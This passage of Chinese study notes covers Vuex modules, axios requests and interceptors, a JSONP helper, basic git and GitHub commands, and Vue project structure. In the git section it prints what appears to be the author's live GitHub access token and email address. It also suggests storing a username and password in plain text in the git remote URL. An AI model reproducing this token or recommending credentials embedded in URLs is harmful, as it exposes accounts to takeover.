      getters: {}
    }
  }
 -->

> 在modules中的 state
- 我们在访问modules中的state的时候, 通过
- $store.state.模块名.模块中属性名

<!-- 
  为什么是state.a, 模块a不是在modules里面定义的么 
  
  因为vuex解析的时候会把模块a放在state中 

  modules: {
    a: {
      state: {
        name:'erin'
      }
    }
  }

  // 组件中访问模块中的state的时候
  $store.state.a.name
-->


> 在modules中的 mutations
- 要点:
- 1. modules中的 mutations 中的方法的形参 state 是modules中的state 并不是vuex中的state

- 2. 模块中定义的mutation 组件中也是使用$store.commit()来提交
<!-- vuex会先去store实例对象中找 updateName 如果没有会去 modules里去找 -->

<!--   
  modules: {
    a: {
      state: {
        name:'erin'               也就是这个state中的变量
      },                                    ↑
      mutations: {                          ↑
        updateName(state) {       这里的state是module里面state
          state.name = 'erinnn'
        }
      }
    }
  }
 -->

- 来个小需求, 组件修改模块中的state中的name, 具体修改什么前端传值
<!-- 
  // 组件
  <button @click='updateName'>修改名字</button>
      - 注意 这里并没有传递值 也就是说不是在组件模板中传值的

  methods: {
    updateName() {
      this.$store.commit('updateName', 'mmmmm')
          - 我们在这里传递了值, 而且, 也是使用$store.commit提交的
          - vuex会先去store实例对象中找 updateName 如果没有会去 modules里去找
    }
  }

  
  // vuex中的modules里
  mutations: {
    updateName(state, payload) {    定义payload接收组件传递的参数
      state.name = payload;
    }
  }
 -->


> 在modules中的 getters
- 要点:
- 组件中使用的时候 也是 通过$store.getters.属性名(方法名)
- 在modules中的getters中的方法 可以有第三个参数 rootstate 
<!-- 
  getters: {
    fullname(state, getters, rootstate)
  }
 -->

<!-- 
  // modules:
  getters: {
    fullname(state) {
      return state.name + 'love sam nn'
    }
  }

  <p>{{$store.getters.fullname}}</p>
 -->

- 需求
- 在modules中引用外成state中的属性
<!-- 
  const store = new Vue.Store({
    state: {
      counter: 1000       ← 指向这里
    },
                                ↘
    modules: {
      state: {
        name: 'erin'
      }
      
      getters: {

        // 注意 在 modules 中方法可以有第三个参数 rootstate执行外层store中的state, 必须是第三个参数第二个是getters
        fullname(state, getters, rootstate) {
          return state.name + rootstate.counter
        }
      }
    }
  })

  // 组件
  <p>{{$store.getters.fullname}}</p>
 -->


> 在modules中的 actions
- actions中有一个参数叫context 这个只是modules 模块中的上下文对象 指向的都是模块中的东西

- context中还是有很多东西的 有很多实用的属性 可以打印下看看
<!-- 
  之前我们都是 这么写
  aUpdateName(context) { ... }

  其实还可以这么写  利用对象的解构 将context中的属性解构出来 我们从context中取出了三个属性
  aUpdateName({state, commit, rootState}) { ... }
 -->

<!-- 
  注意 模块中的actions中的方法中的context 指向的不是store实例对象中的mutations 而是自己模块中的mutations

  const moduleA = {
  state: {
    name:'erin',
  },
  mutations: {
    updateName(state, payload) {
      state.name = payload;
    }
  },

  // 使用context.commit('') 提交到modules中的mutations里 updateName
  // 我们异步修改下 模块中的变量 name
  actions: {
    aUpdateName(context) {
      setTimeout(() => {
        context.commit('updateName', 'liuliuliu')
      }, 1000)
    }
  }
}


  // 组件中
  <button @click='asyncUpdateName'>异步修改名字</button>

  asyncUpdateName() {

    // 这里也是直接使用 $store.dispatch('到模块中的actions中的方法')
    this.$store.dispatch('aUpdateName');
  }



  // 总结下
  组件的html模板中  
          --- 提交到 组件的方法

  组件的方法 使用 this.$store.dispatch 
          --- 提交到 vuex 中的 modules 中的 actions 中的方法

  modules中的actions中的方法 使用 context.commit() 
          --- 提交到 modules 中的 mutations 中的方法 来进行修改
 -->

--------------------------

### vuex-store的文件夹的目录组织
- store文件夹是作为vue相关状态管理的文件夹

  | - store
    - index.js        // 我们组装模块并导出store的地方
    - actions.js      // 根级别的 actions
    - mutations.js    // 根级别的 mutations
    | - modules
      - cart.js       // 购物车模块
      - products.js   // 产品模块

- 我们上面 vuex 相关的代码都是写在index.js文件里面, 但是随着项目代码不断的增多, 这个文件中的代码太多就变的越发的不容易管理

- vue建议我们对index.js中的文件代码做抽离
<!-- 
  index.js文件中

  const state = {
    
    这里放状态变量

  }


  const store = new Vuex.Store({
    state,        也就是说将代码抽离到实例的外面
    mutations,    不建议抽离在index.js文件中 而是将到抽离到别的js文件 利用导出和导入关联起来

    ...

    modules       这个的抽离建议创建一个文件夹
  })
 -->

--------------------------

### axios
- 程序开发中离不开请求, 即使我们选择了第三方框架 我们也对这个第三方框架进行封装, 然后使用我们自己封装好的模块进行网络请求
<!-- 
  我们不会直接使用第三方框架, 因为有一天它可能不维护了 或者 出现了严重的bug
 -->

> 选择什么网络模块
- 1. 传统的ajax是基于XMLHttpRequest
<!-- 
  为什么不用它?
  - 配置和调用方式非常混乱
  - 编码起来看起来非常的蛋疼
  - 真是开发中是使用jQ-ajax
 -->

- 2. jQ-ajax
<!-- 
  为什么不用它
  - 相对于传统的ajax非常好用
  - 但是在Vue的整个开发中都是不需要使用jQ了
  - jQ是一个重量级的框架, 没必要为了使用jQ的ajax就引用一个如此大的框架
 -->

- 3. vue 1.x版本的时候 官方退出了vue-resource
<!-- 
  为什么不选择它
  在vue2.0推出后, vue作者就在github的issues中说了去掉vue-resource并且以后不会更新
 -->

- 总结
- 之后我们会对axios来进行封装并做深入的了解

> jsonp 的封装
- 在前端开发中 我们一种常见的网络请求方式就是jsonp, 使用jsonp最主要的原因万网是为了解决跨域访问的问题

- jsonp的原理
- jsonp的核心在于通过<script>标签的src来帮助我们请求数据
- 原因是我们的项目部署在domain1.com服务器上时, 是不能直接访问domain2.com服务器上的资料的
- 这个时候我们利用<script>标签的src帮助我们去服务器请求到数据, 将数据当做一个js的函数来执行, 并且执行的过程中传入我们需要的json

- 所以 封装jsonp的核心就在于我们监听window上的jsonp进行回调时的名称
<!-- 
  封装 jsonp
  let count = 1;
  export default function originPJSONP(option) {
    // 1 从传入的option中提取url
    const url = option.url;

    // 2 在body中添加script标签
    const body = document.getElementsByTagName('body')[0];
    const script = document.createElement('script');

    // 3 内部生产一个不重复的callback
    const callback = 'jsonp' + count++

    // 4 监听window上的jsonp的调用
    return new Promise((resolve, reject) => {
      try {
        window[callback] = function(result) {
          body.removeChild(script)
          resolve(result)
        }
        const params = handleParam(option.data);
        script.src = url + '?callback=' + callback + params;
        body.appendChild(script)
      } catch (err) {
        body.removeChild(script)
        reject(err)
      }
    })
  }

  function handleParam(data) {
    let url = ''
    for(let key in data) {
      let value = data[key] !== undefined ? data[key] :''
      url += `&${key}=${encodeURIComponent(value)}`
    }
    return url
  }
 -->


> axios (ajax i/o system ? )
- 功能特点
- 在浏览器中发送 XMLHttpRequests 请求
- 在node.js中发送http请求
<!-- 
  node是一个环境 比如jQ就不能在node中使用 但是axios就可以
 -->
- 支持 promise api
- 拦截请求和响应
- 转换请求和响应数据
- 等等

--------------------------

### axios 框架的基本使用
- 这个框架支持多种请求方式
- axios(config)             通用
- axios.request(config)
- axios.get(url[, config])
- axios.delete(url[, config])
- axios.head(url[, config])
- axios.post(url[, data[, config]])
- axios.put(url[, data[, config]])
- axios.patch(url[, data[, config]])


> axios的使用
- httpbin.org
- 用于模拟网络请求的网站
<!-- 
  老师搭建的服务器
  http://123.207.32.32:8000/home/multidata
  http://123.207.32.32:8000/home/data?type=sell@page=1
  http://123.207.32.32:8000/home/data
 -->
- 如果不指定请求方式, 默认的情况下就是 GET 请求

- 1. 安装 axios 框架
- npm i axios --save
<!-- 
  视频里是0.18.0
 -->

- 2. 在哪个文件里发送axios请求都可以 视频里是在main.js文件中
  - 2.1 在文件中引入
  - import axios from 'axios';

  - 2.2 在文件中使用
  - axios({ ... })
<!-- 
  // axios 最简单的使用过程

  axios({
    url:'http://123.207.32.32:8000/home/multidata',
    // 请求方式
    method: '',

    // 参数
    // 或者在url属性的后面拼接 http://123.207.32.32:8000/home/data?type=sell@page=1 参数
    params: {
      type: 'pop',
      page: 1
    },


  // 成功的结果通过 then 方法取得
  }).then(res => {
    console.log(res);
  })

  axios支持promise 所以不用像jQ那样 在{config}中写 success: function 
  而是直接axios().then() 
  
  axios会返回一个promise 内部会执行resolve 所以我们可以使用then
-->

> 发送get请求的演示
- 下面的代码抄写的屏幕
<!-- 
  // 引入 axios
  import axios from 'axios';

  export default {
    name: 'app',

    // 为什么这里没有跨域的问题?
    // 1. 没有请求参数
    axios.get('http://123.207.32.32:8000/category')
      .then(res => {
        console.log(res)
      }).catch(err => {
        console.log(err)
      })

    // 2. 有请求参数
    axios.get('http://123.207.32.32:8000/home/data', {params:{type:'sell', page: 1}})
      .then(res => {
        console.log(res)
      }).catch(err => {
        console.log(err)
      })
  }
 -->

--------------------------

### axios 发送并发请求
- axios提供如果想发送多个并发请求, 想让这两个请求都成功之后再做响应处理的话, axios提供了api

> axios.all()
- 参数
- 传递一个数组 axios.all([请求1, 请求2]).then(成功的结果)
<!-- 
  then() 中会拿到多个请求的结果 当多个请求都成功的时候会到then()方法里面 results(请求成功返回的数据) 是一个数组[{}, {}]
 -->

<!-- 
  axios.all([
    // 请求1
    axios({
      url:'http://123.207.32.32:8000/home/multidata'
    }),

    // 请求2
    axios({
      url:'http://123.207.32.32:8000/home/data',
      params: {
        type: 'sell',
        page: 5
      }
    })

  // 成功的部分
  ]).then(results => {

    // 这里会拿到多个请求的结果 当多个请求都成功的时候会到then()方法里面 results 是一个数组[{}, {}]
    console.log(results)
    console.log(results[0])
    console.log(results[1])
  })

 -->


> then(axios.spread((请求结果1, 请求结果2, ...) => { ... }))
- 上面我们是通过result[0] 通过下标的方式去读请求回来的数据的结果
- axios直接给我们提供了直接获取请求结果的api
<!-- 
  axios.all([
    axios({
      url:'http://123.207.32.32:8000/home/multidata'
    }),
    axios({
      url:'http://123.207.32.32:8000/home/data',
      params: {
        type: 'sell',
        page: 5
      }
    })
  ]).then(axios.spread((res1, res2) => {

    // 直接获取的数据 不用通过下标的方式
    console.log(res1);
    console.log(res2);
  }))
 -->

--------------------------

### axios 的配置信息相关
- 在上面的示例中, 我们的baseURL都是固定的, 事实上, 在开发中可能很多参数都是固定的, 这个时候我们可以进行一些抽取 也可以利用axios的全局配置
<!-- 
  baseURL: 123.207.32.32:8000

  比如固定的请求头的信息
  Content-Type : application/x-www-form-urlencoded

  比如超时时间, 5秒没有响应就超时了 等等

  这样如果有请多的请求, 那么每个请求中都有 baseURL timeout header 等代码就重复了 这时我们就可以进行全局配置
 -->

> axios.defaults 配置axios的全局属性
- 我们可以将所有请求的公共部分, 放在 axios.default 中, 给它添加属性就是配置全局属性
- 写在哪都可以
<!-- 
  axios.defaults.baseURL = '123.207.32.32:8000'
  axios.defaults.headers.post['Content-Type'] = 'application/x-www-form-urlencoded'
  axios.defaults.timeout = 5;   // 单位是毫秒 5000是 5秒
 -->

<!-- 
  axios.defaults.baseURL = 'http://123.207.32.32:8000';
  axios.defaults.timeout = 5;

  axios.all([
    axios({
      // 因为我们配置了 baseURL 所以这里我们直接写接口
      url:'/home/multidata'
    }),
    axios({
      url:'/home/data',
      params: {
        type: 'sell',
        page: 5
      }
    })
  ]).then(axios.spread((res1, res2) => {
    console.log(res1);
    console.log(res2);
  }))
 -->


> 常见的配置选项
- 请求地址
  - url: '/user'

- 请求类型
  - method: 'GET'

- 请根路径
  - baseURL: 'http://www.mt.com'

- 请求前的数据处理
  - transformRequest:[function(data){}]

- 请求后的数据处理
  - transformResponse:[function(data){}]

- 自定义请求头
  - headers: {'x-Requested-With' : 'XMLHttpRequest'}

- URL查询对象
  - params: {id:12}

---

- 查询对象序列化函数
  - paramsSerializer: function(params) {}

- 请求体 request body
  - data: {key:'aa'}    

- 超时设置s
  - timeout: 1000

- 跨域是否带Token
  - withCredentials: false

- 自定义请求处理
  - adapter: function(resolve, reject, config) { }

- 身份验证信息
  - auth: {uname: '', pwd: '12'}

- 响应的数据格式 json / blob / document / arraybuffer / text / stream
  - responseType: 'json'

<!-- 
  要点:
  method: "GET"
  params: { id: 1 }

  method: "POST"
  data: { key: ''}

  当提交请求的方式是get的时候  提交参数要用params
  当提交请求的方式是post的时候 提交参数要用data
 -->

--------------------------

### axios 的实例
- 上面我们了解了 axios.defaults 的方式给axios发送请求的时候配置全局的公共部分

- 为什么要创建axios的实例呢?
- 当我们从axios模块中导入对象时, 使用的实例是默认的实例
- 当给该实例设置一些默认配置时, 这些配置就被固定下来了
- 但是后续开发中, 某些配置可能会不太一样
- 比如某些请求需要使用特定的baseURL或者timeout或者content-type等
<!-- 但是有些情况会有 baseURL 不一样, timeout 也不一样的情况 -->

- 这个时候, 我们就可以创建新的实例, 并且传入属于该实例的配置信息


> 插个服务器的概念:
- 服务器有一个概念叫做分步式, 服务器在部署的时候, 当它的并发量(同时请求的数量)特别的高的情况下, 服务器可能就不能满足整个的业务需求, 同时有很多用户向服务器发送请求的时候, 服务器可能会处理不过来

- 当业务量特别的大的时候, 我们会搞很多个服务器, 那么这三个服务器的ip地址就会不一样
<!-- 
  服务器A   首页请求的服务器
  服务器B   类型请求的服务器
  服务器C   其它的东西的服务器
 -->

<!-- 
  客户端A                       服务器A

  客户端B     反向代理服务器      服务器B
              nginx部署
  客户端C                       服务器C

  客户端不管有多少客户面对的都是一个反向代理服务器
  nginx会根据哪一个服务器目前请求量不是很多, 来判断去哪一个服务器请求数据
 -->


- 假设 我们首页数据 我们要向 服务器A请求, 分类要向服务器B请求... 那么客户端就会有不同的ip地址
<!-- 
  事实上不多, 事实上是上面我们了解的反向代理服务器的概念
 -->

- 这个时候我们使用 axios.defaults 设置全局的baseURL就不合适了 
- 所以一般我们使用axios发送请求的时候 不会直接使用全局配置来进行网络请求, 而是先创建axios的实例


> axios的真正的使用方式
- 前置步骤
- 下载 和 引入

- 1. 创建 axios 实例  通过 axios.create() 创建
<!-- 
  const instance1 = axios.create({ 
    
    实例中配置 公共的配置
    比如
    baseURL
    timeout
    请求头信息等

  });
 -->

- 2. 通过 intance1({ ... }) 代替 axios({ ... }) 创建 请求
<!-- 
  之前我们发送请求都是
  axios({})

  现在我们是通过创建的实例发送
  instance1({})
 -->

<!-- 
  // 创建 axios 实例 并在实例中配置公共配置
  const instance1 = axios.create({
    baseURL: 'http://123.207.32.32:8000',
    timeout: 5000
  });

  // 使用实例对象 发送请求
  instance1({
    url:'/home/multidata'
  }).then(res => {
    console.log(res);
  })


  // 使用同一个实例对象 发送请求
  instance1({
    url: '/home/data',
    params: {
      type: 'pop',
      page: 1
    }
  }).then(res => {
    console.log(res);
  })


  // 创建新的实例, 在实例中填写新的 公共配置
  const instance2 = axios.create({
    baseURL: 'http://222.111.32.32:5000',
    timeout: 10000,
    headers: ...
  });

  ... 

  这样的话 每一个实例都会有自己独立的配置
 -->

- 以后在开发的过程中不要如下操作
- 我们在组件中引入了axios模块, 然后分别在script中发送了请求, 并展示在页面上
- 当有多个组件并且都使用下面的方式发送请求的时候, 这样多个组件对第三方模块的依赖性太强了

- 问题是如果有一天axios这个框架不再维护了 那就懵逼了, 所以只有我们在进行开发的时候如有我们依赖了第三方的东西, 千万不要在每一个组件里面都对这个第三方的东西进行依赖
<!-- 
  比如 我们在 app.vue 文件中要发送网络请求, 很多同学就会这样
  import axios from 'axios'

  <template>
    <div id='app'>

      // 将保存早data中的数据在页面中进行展示
      <div> {{result}} </div>

    </div>
  </template>

  export default {
    name:'App',
    data() {
      return {
        result: ''
      }
    }
    // 在组件被创建的时候发送网络请求
    created() {
      axios({
        url: 'http://123.207.32.32:8000/home/multidata'
      }).then(res=> {
        
        // 将我们取到的结果 保存在data中
        this.result = res
      })
    }
  }
 -->

- 我们应该这样
<!--    
                        axios     →       新的框架

                  对axios进行自己的封装

            ↙     ↙       ↓     ↘      ↘

      组件1     组件2     组件3     组件4     组件5


  假如我们很多组件都需要依赖于axios进行依赖发送请求, 我们应该单独的创建一个文件之后所有的组件在做网络请求的时候都是面向 我们自己封装的文件

  而之后我们单独创建的文件在根据axios进行一个封装 如果有一天axios不维护了那么我只需要改 我们封装的文件就可以了

  以后再遇到第三方框架的时候都要用这种逻辑来使用
 -->


> 对 axios 进行封装
- 1. 在src中创建 network 文件夹 创建 request.js 文件
<!-- 
  也就是说其他组件在发送网络请求的时候 面向 request.js 文件就可以了
  导出这个文件的时候 使用

  export function request() { ... }

  这样以后再有别的实例 还可以继续导出

  export function request1() { ... }
  export function request2() { ... }
 -->

- 2. 方式1
- request.js中 通过回调的方式 将请求的结果 和 错误对象 回调回去
<!-- 
  export function request(config, success, failure) {

    // 创建 axios 实例 实例中写上公共配置
    const instance = axios.create({
      baseURL: 'http://123.207.32.32:8000',
      timeout: 5000
    })

    // 别人传递进来的config要传到实例里面才能进行网络请求 所以
    instance(config)
      .then(res => {

        // 通过success函数 将成功的结果回调出去
        success(res);
      })
      .catch(err => {

        // 通过failure函数 将失败的结果回调出去
        failure(err);
      })
  }


  // 组件中在使用的时候
  request({
    url: 'home/multidata'

    // success回调函数
  }, res => {
    // 这里可以打印 或者将结果保存在组件的data中
    console.log(res);

    // failure回调函数
  }, err => {

    // 这里就是请求失败的错误对象err是axios回调出来的
    console.log(err)
  })
 -->

- 2. 方式2
- 调用者在传递参数的时候, 参数内部必须有 baseConfig, success, failure
- 相当于 组件在使用的时候 request({}) 中的{}就是config
<!-- 
  config对象里面有
  {
    baseConfig: {
      配置
    },
    success: function() { ... }
    failure: function() { ... }
  }
 -->

<!-- 
  export function request(config) {

    // 创建实例
    const instance = axios.create({
      url: 'http://123.207.32.32:8000',
      timeout: 5000
    })

    instance(config.baseConfig)
      .then(res => {
        config.success(res);
      })
      .catch(err => {
        config.failure(err);
      })
  }


  // 组件中在使用的时候
  request({
    baseConfig: {
      url:'/home/data'
    },
    success: function(res) {
      console.log(res)
    },
    failure: function(err) {
      console.log(err)
    }
  })
 -->


> 最终方案过渡 promise
- 使用promise
<!-- 
  // request.js

  export function request(config) {
    return new Promise((resolve, reject) => {
      // 网络请求都是异步操作 我们把它放到这里
        const instance = axios.create({
          baseURL: 'http://123.207.32.32:8000',
          timeout: 5000
        })

        instance(config)
        .then(res => {
          resolve(res)
        })
        .catch(err => {
          reject(err)
        })
    })
  }


  // 组件中调用
  request({
    url: '/home/data'
  }).then(res => {
    console.log(res)
  }).catch(err => {
    console.log(err)
  })
 -->

> 最终方案
- axios 通过 axios.create() 创建的对象本身就是promise对象 所以没有return new Promise
<!-- 
  export function request(config) {
    // 网络请求都是异步操作 我们把它放到这里
    const instance = axios.create({
      baseURL: 'http://123.207.32.32:8000',
      timeout: 5000
    })

    // 这个实例本身返回的就是promise 所以组件中可以通过then catch拿到结果
    return instance(config)
  }


  // 组件中调用
  request({
    url: '/home/data'
  }).then(res => {
    console.log(res)
  }).catch(err => {
    console.log(err)
  })
 -->

--------------------------

### axios 拦截器的使用
- 在发送网络请求之前希望对某些请求做一些拦截, 比如拼接上一些东西或者查看是否携带了一些东西 在发送网络请求之前增加动画啦

- axios提交了拦截器, 用于我们在发送每次请求或者得到响应后, 进行对应的处理
<!-- 
  请求成功 和 请求失败 的拦截
  instance.interceptors.request.use(config => {
    console.log('来到了request拦截success中')
    return config
  }, err => {
    console.log('来到了request拦截failure中')
    return err
  })


  响应成功 和 响应失败 的拦截
  instance.interceptors.response.use(response => {
     console.log('来熬了response拦截success中')
     return response.data
   }. err => {
     console.log('来到了response拦截failure中')
     return err
   })
 -->

> axios.interceptors.request  -- 拦截全局axios的请求(成功和失败)
> axios.interceptors.response -- 拦截全局axios的响应(成功和失败)
- 上面都是拦截的全局axios 还可以拦截axios创建的实例
<!-- 
  const instance = axios.create({

    // 还可以拦截实例
    instance.interceptors.request
    instance.interceptors.response
  })
 -->

> 实例 / 全局.interceptors.request.use() 
> 实例 / 全局.interceptors.response.use() 
- 参数
- 是两个函数, 一个请求 / 响应 成功的函数 一个请求 / 响应 失败的函数
- 请求拦截中的参数是 config 拦截的是请求体(配置信息 比如 url method等)
- 响应拦截中的参数是 res 拦截的是响应体(status data headers request等)
<!-- 
  export function request(config) {
  const instance = axios.create({
    baseURL: 'http://123.207.32.32:8000',
    timeout: 5000
  })

  // 使用拦截器拦截实例, 请求拦截
  instance.interceptors.request.use(config => {

    // 拦截的是axios发送请求的配置
    console.log(config)
    // 拦截到的config的return出去 要不内部的config外部拿不到

    // 一般请求拦截会在这里处理什么逻辑
    1. 比如config中的信息不符合服务器的要求 比如会config中的东西进行某种变化后再返回回去

    2. 比如每次发送网络请求时, 都希望在界面中显示一个请求的图标(请求时的加载动画), 每次在发送请求的时候将动画show出来, 然后响应数据的时候 再去响应拦截里面隐藏起来

    3. 某些网络请求(比如登录 token), 必须携带一些特殊的信息 

    return config

  }, err => {

    // 发送都没发送出去, 比如网络断掉了
    console.log(err)
  })


  // 使用拦截器进行响应的拦截
  instance.interceptors.response.use(res => {
    console.log(res)
    // res中里面有data, 我们真正有用的就是data 我们会从res中取出data
    
    // 在这里一样 我们做完处理完拦截响应的逻辑后 要将res.data返回出去 要不组件中得不到结果 返回data就可以
    return res.data

  }, err => {
    console.log(err)
  })

  // 发送真正的网络请求
  return instance(config)
}
 -->

> 请求拦截的作用
- 一般请求拦截中会处理什么逻辑
- 1. 比如config中的信息不符合服务器的要求 比如会config中的东西进行某种变化后再返回回去

- 2. 比如每次发送网络请求时, 都希望在界面中显示一个请求的图标(请求时的加载动画), 每次在发送请求的时候将动画show出来, 然后响应数据的时候 再去响应拦截里面隐藏起来

- 3. 某些网络请求(比如登录 token), 必须携带一些特殊的信息 

--------------------------

### 项目开发 --- 项目创建 和 github托管

> github的使用
- 1. https://github.com/

- 2. 右上角 + New repository


> github的基本概念
> repository / git project
- 仓库 即我们的项目, 我们想在github上开源一个项目 那就必须新建一个仓库
- 每个项目对应一个仓库

- 我们通过git管理这个仓库


> git初始化
- 在项目文件夹下面 邮件 git - here
- 1. 创建项目文件夹
<!-- 
  mkdir test
 -->

- 2. 进入到项目文件夹 test 内
<!-- 
  cd test
 -->

- 3. 将项目文件夹变成git仓库
<!-- 
  git init
 -->

- 4. 向仓库中添加文件
<!-- 
  首先文件夹中要有文件
  ↓
  先提交到暂存区
  ↓
  再提交到git仓库
 -->
  - 4.1 创建文件
    - touch 1.txt

  - 4.2 将文件添加到暂存区
    - git add 1.txt

  - 4.3 将文件从暂存区提交到仓库
    - git commit -m '描述'


> 链接远程仓库
- 使用 git push 命令
<!-- 
  但是有的时候会报 没有权限的错误
  或者
  the request url returned error 403 ...

  原因:
  私有项目 没有权限 输入用户名密码 或者远程地址采用这种类型

  vi .git/config  修改.git下的config 文件

  将
  [remote "origin"]
    url = https://github.com/用户名/仓库名.git

  修改为
  [remote "origin"]
    url = https://用户名:密码@github.com/用户名/仓库名.git
 -->



> 扩展
- pwd 查看路径
- touch 1.txt     创建文件
- git status      查看状态
- ls              查看目录
- git add 文件名  将文件从工作区添加到暂存区

- git commit -m '描述' 
                  将文件从暂存区添加到仓库

- git push        将本地仓库提交到远程仓库

- git clone '仓库地址'
                  其实就是下载

- git config --global user.name 'slnn2080'
- git config -- global user.email 'love.nn.linlin@gmail.com'
                  初始化用户名和密码

- git config --list
                  查看信息

- git remote add origin https://github.com/slnn2080/exermall.git

- vi 文件名       修改文件内容

- git remote rm origin
                  先删除远程 Git 仓库

$ git remote add origin git@github.com:FBing/java-code-generator
                  再添加远程 Git 仓库


> Vue项目相关
- 上面相当于扩展知识
- 我们通过cli3创建了一个项目, 项目中我们希望用到github但是现在 我们本地的项目 并没有和我们github上的仓库关联起来 接下来我们完成下这个部分

- 1. 去仓库中复制地址
<!-- 
  https://github.com/slnn2080/exermall.git
 -->

- 2. 通过上面的网址 将仓库中的东西(空的) clone到本地
<!-- 
  git clone https://github.com/slnn2080/exermall.git
 -->

- 3. 将我们cli3创建的项目拷贝到我们克隆下来的仓库里
<!-- 
  除了 .git文件夹
  除了 node_module 文件夹
 -->

- 4. 进入到克隆下来的仓库文件夹里面
<!-- 
  将所有的东西 添加到 暂存区 
  git add .
 -->

- 5. 通过 git commit -m '初始化项目'
<!-- 
  通过 commit 添加到本地仓库
 -->

- 6. 通过 git push 到远程仓库
<!-- 
  我的github token
  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
 -->

> 我们通过cli3创建的项目里面自带的.git 那如果让这个.git和远程仓库链接起来? 而不是克隆远程仓库, 复制粘贴到克隆下来的文件夹里呢?
- 执行这两条指令就可以
<!-- 
  git remote add orgin https://github.com/slnn2080/exermall.git
  git push -u origin master
 -->

--------------------------

### 项目开发 - 划分目录结构
- 当有一个新的项目时, 应该做的第一件事就是划分目录结构, 我们只需要负责 src 文件夹的结构划分就可以 一般其它的都不需要动的

<!-- 
  | - src
    | - assets        // 资源 比如图片 css 
      | - img
      | - css
        - normalize.css
        - base.css

    | - components    // 公共组件 比如这个组件既在home又在category用
      | - common      // 当前项目下共用的组件 甚至是下一个项目也可共用的组件
      | - content     // 只跟当前项目中是共用的组件

    | - views         // 大的视图 首页之类的

    | - router
    | - store         // vuex
    | - network       // 网络相关的
    | - common        // 公共的js文件
      - const.js      //  当有一些公共的常量要抽取的时候放在这里
      - utils         // 工具函数 工具类
      - mixin.js      // 混入
 -->

--------------------------

### 项目开发 - css文件的引入
- 我们在放css的文件夹里面放了两个css文件base.css 和 normalize.css

- 我们在base.css中引入normalize.css
<!-- 
  @import './normalize.css';
 -->

- 在App.vue文件中 引入base.css
<!-- 
  <style>
    @import './assets/css/base.css';
  </style>
 -->

--------------------------

### 项目开发 - vue-config 和 .editorconfig

> cli3中配置别名
<!-- 配置完别名后就不用通过../../的形式找文件了 -->

> 项目根目录下创建 vue.config.js 文件
<!-- 
  // 在文件内部导出配置 这个配置会和node_module中的配置最终会进行合并
  module.exports = {
    configureWebpack: {
      resolve: {
        alias: {
          // cli3中内部已经对src文件夹配置别名 @ 了
          'assets': '@/assets',
          'common': '@/common',
          'components': '@/components',
          'network': '@/network',
          'views': '@/views'
        }
      }
    }
  }
 -->


> .editorconfig
- 在通过脚手架2搭建的项目 会自动创建一个 .editorconfig
- 它的目的是对我们的代码风格的问题做一个统一 比如缩进 最后一行是否换行等

- 一般情况下 项目里都要有这个文件
<!-- 
  root = true

  [*]
  charset = utf-8
  indent_style = space
  indent_size = 2
  end_of_line = 1f
  insert_final_newline = true
  trim_trailing_whitespace = true
 -->  

--------------------------

### 项目开发 - tabbar引入和项目模块划分
- 我们引入上面开发好的tarbar 将tarbar的文件夹整体的拿过来
- 在html中的src等使用别名的话 前面要加上 ~
<!-- 
  包括组件中的 style 标签内
  @import '~assets/css/iconfont/iconfont.css';
 -->

- 我们将这个tabbar导入到app.vue文件中


> 网页 icon图标的修改
- 我们把新的icon复制粘贴到我们自己的项目的public文件夹内就可以
<!-- 
  <link rel="icon" href="<%= BASE_URL %>favicon.ico">
 -->

> <%= BASE_URL %>
- 获取当前文件所在的路径 在当前所在的路径取找icon 这个是jsp语法 为了动态的获取文件的路径
- 也不用担心jsp语法会不会被html识别, 因为我们最终会进行打包 publick这个文件夹(相当于static文件夹)最终会原封不动的复制到dist里面
- 打包的时候会以public文件夹里的html位置作为模板来打包 并不会出现jsp的语法

--------------------------

### 项目开发 - 首页导航栏的封装的使用
- 我们观察到这个项目 navbar 的部分, 每个分类中的 navbar 的部分样式都不一样, 有的页只有标题 有的页还有选项卡和箭头, 所以我们也要把导航栏封装成一个独立的组件 使用slot

> 扩展:
- 一般文件夹小写 文件名大写 这是一种风格
<!-- 
  src\components\common\navbar\NavBar.vue
 -->


> NavBar.vue 中 封装 nav-bar
- 我们要给整体设置下样式, 这样别人在调用的时候就可以直接使用
<!-- 
  <template>
    <div class='nav-bar'>
      <div class='left'><slot name='left'></slot></div>
      <div class='center'><slot name='center'></slot></div>
      <div class='right'><slot name='right'></slot></div>
    </div>
  </template>

  我们对整个组件进行些布局, 因为左右插槽需要在两侧, 剩下宽度给中间的插槽
  那就势必要用到css样式

  再给插槽写css样式的时候 我们要把slot套一层div 属性要写在div上, 因为插槽slot会被替换掉的
 -->


> NavBar.vue的使用
- 我们看看封装好的组件会在各个页面中使用, 下面我们说下在 home.vue 文件中调用
<!-- 
  <template>
    <div id='home'>
      <nav-bar>

        // 具名插槽的时候 要使用<template #插槽的名字>
        <template #center>
          <span>购物车</span>
        </template>

      </nav-bar>
    </div>
  </template>
 -->

- home.vue文件中设置nav-bar的背景颜色
<!-- 
  我们不能在NavBar.vue文件中设置导航条的背景颜色, 因为在这里设置后组件被调用的时候就会是默认色了
  
  所以这里我们给 <组件> 上设置一个class 通过class给组件设置背景色

  <template>
    <div id='home'>

      // 这里我们给 <nav-bar class='home-nav'> 设置了class 
      <nav-bar class='home-nav'>
        <template #center>
          <span>购物车</span>
        </template>
      </nav-bar>

    </div>
  </template>


  <style scoped>
    .home-nav {
      background:var(--color-tint);
      color:#fff;
    }
  </style>
 -->


> 调试
- 1. 先利用f12中的vue 看看组件有没有被添加进来
- 2. 在去elements看看结构

--------------------------

### 首页开发 - 请求首页的多个数据
- 首页的导航栏我们已经封装完了, 接下来该下面的一个结构, 该轮播图了
- 但是在做轮播图之前, 我们要先把轮播图的数据先请求过来, 因为即使把轮播图做好 没有数据也办法进行展示
<!-- 
  实际开发中的逻辑
  应该先获取数据 然后再根据数据进行展示比较好, 也有种情况是公司服务器还没有开发完呢 可能还没有数据 这时候只能按照模拟的数据先把东西做好

  正常的逻辑就是 我们都是从服务器拿到数据 然后根据数据来创建对应标签
 -->


- 1. 在network文件夹中创建 关于请求相关的request.js文件
- 安装 axios  npm i axios --save
- 这里我们还是需要拦截器的 因为要对请求回来的data做一步转化来返回出去
<!-- 
  request.js

  import axios from 'axios'

  export function request(config) {
    // 1.创建axios的实例
    const instance = axios.create({
      baseURL: 'http://123.207.32.32:8000',
      timeout: 5000
    })

    // 请求拦截
    instance.interceptors.request.use(config => {
      return config
    }, err => {
      // console.log(err);
    })

    // 响应拦截
    instance.interceptors.response.use(res => {
      return res.data
    }, err => {
      console.log(err);
    })

    // 3.发送真正的网络请求
    return instance(config)
  }

